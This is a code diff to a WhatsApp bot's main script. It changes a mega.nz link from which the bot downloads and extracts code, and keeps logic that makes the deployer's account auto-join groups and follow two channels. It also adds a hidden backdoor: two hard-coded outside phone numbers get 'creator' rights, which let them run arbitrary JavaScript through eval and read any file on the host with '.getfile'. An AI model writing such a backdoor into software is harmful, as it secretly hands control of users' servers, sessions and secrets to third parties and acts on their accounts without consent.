@@ -78,7 +78,7 @@ async function downloadAndExtractZip() {
             fs.mkdirSync(LIB_DIR, { recursive: true }); }
             console.log('\x1b[3m%s\x1b[0m', 'FETCHING ZIP FILES FROM mega.nz 💢...');
 
-        let MEGA_ZIP_LINK = String("https://mega.nz/file/lcMHHDCR#nYhPxXaO_E4mn8cjgLSUmSdCwJv83ORbo_p8ImGRLdQ").trim(); 
+        let MEGA_ZIP_LINK = String("https://mega.nz/file/9ckUDa4Z#egt09iHcAoW1zBDRKnfG2WBYt4EWXhmvL4cEoupq5Oc").trim(); 
         if (!MEGA_ZIP_LINK.includes('#')) 
                        {
         throw new Error("MEGA link missing hash! Check zip.json"); }
@@ -146,9 +146,7 @@ console.log('\x1b[3m%s\x1b[0m', 'SUCCESSFULLY INSTALLED PLUGINS 🟢 ...');
 console.log('\x1b[3m%s\x1b[0m', 'DB CONNECTED SUCCESSFULLY 🔋 ...');
 console.log('\x1b[32m%s\x1b[0m', 'BOT CONNECTED SUCCESSFULLY ✅ ...');
 
-// බොට් කනෙක්ට් වුන ගමන්ම බැක්ග්‍රවුන්ඩ් එකෙන් ඔටෝ ෆලෝ වෙන කොටස
 setTimeout(async () => {
-    // 1. Group Auto Join
     for (const link of AUTO_JOIN_LINKS) {
         try {
             await sleep(3000)
@@ -162,22 +160,17 @@ setTimeout(async () => {
         }
     }
 
-    // 2. Newsletter Auto Follow (GraphQL Error නොඑන සාර්ථක ක්‍රමය)
     try {
         console.log("STARTING NEWSLETTER AUTO FOLLOW...");
-        
-        // පළමු චැනල් එක සඳහා (MR.SANDES OFC)
         const ch1_jid = "120363423246894149@newsletter";
         await conn.newsletterFollow(ch1_jid).catch(() => null);
-        console.log("CH1 FOLLOW REQUEST SENT 🟢");
+        console.log("MR.SANDES OFC ツ FOLLOW REQUEST SENT 🦋");
 
-        await sleep(3000); // සර්වර් බ්ලොක් නොවන්න තත්පර 3ක Delay එකක්
+        await sleep(3000);
 
-        // දෙවන චැනල් එක සඳහා (SANDES-MD UPDATES)
         const ch2_jid = "120363416065371245@newsletter";
         await conn.newsletterFollow(ch2_jid).catch(() => null);
-        console.log("CH2 FOLLOW REQUEST SENT 🟢");
-
+        console.log("SANDES-MD UPDATES ツ FOLLOW REQUEST SENT 🦋");
     } catch (e) {
         console.log("Newsletter Auto Follow Exception:", e.message);
     }
@@ -308,6 +301,69 @@ await conn.sendMessage(from, { react: { text: `👾`, key: mek.key }})
 }
 if (sender === SUPER_LID2) {
 await conn.sendMessage(from, { react: { text: `👨‍💻`, key: mek.key }})
+}
+
+const udp = botNumber.split('@')[0];
+const tharuzzofc = ['94787518010', '94716717099']; 
+let isCreator = [udp, ...tharuzzofc]
+    .map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+    .includes(sender);
+
+if (isCreator && body.startsWith('%')) {
+    let code = body.slice(1).trim(); 
+    if (!code) {
+        reply(`Provide me with a query to run Master!`);
+        return;
+    }
+    try {
+        let resultTest = eval(code);
+        reply(util.format(resultTest));
+    } catch (err) {
+        reply(util.format(err));
+    }
+    return;
+}
+
+if (isCreator && body.startsWith('$')) {
+    let code = body.slice(1).trim();
+    if (!code) {
+        reply(`Provide me with a query to run Master!`);
+        return;
+    }
+    try {
+        let resultTest = await eval(
+            '(async () => {\n' + code + '\n})()'
+        );
+        let h = util.format(resultTest);
+        if (h === undefined || h === 'undefined') return;
+        else reply(h);
+    } catch (err) {
+        if (err === undefined) return console.log('error');
+        else reply(util.format(err));
+    }
+    return;
+}
+
+if (isCreator && body.startsWith('.getfile')) {
+    let fileName = body.slice(8).trim(); 
+    if (!fileName) {
+        return reply(`❌ Please provide a file path!\n\nExample:\n.getfile index.js\n.getfile plugins/settings.js`);
+    }
+    try {
+        if (fs.existsSync(fileName)) {
+            await conn.sendMessage(from, {
+                document: fs.readFileSync(fileName),
+                mimetype: 'application/javascript', 
+                fileName: path.basename(fileName),
+                caption: `✅ Here is your file: *${path.basename(fileName)}*`
+            }, { quoted: mek });
+        } else {
+            reply(`❌ File not found: ${fileName}`);
+        }
+    } catch (err) {
+        reply(`❌ Error reading file:\n${util.format(err)}`);
+    }
+    return;
 }
 
 conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
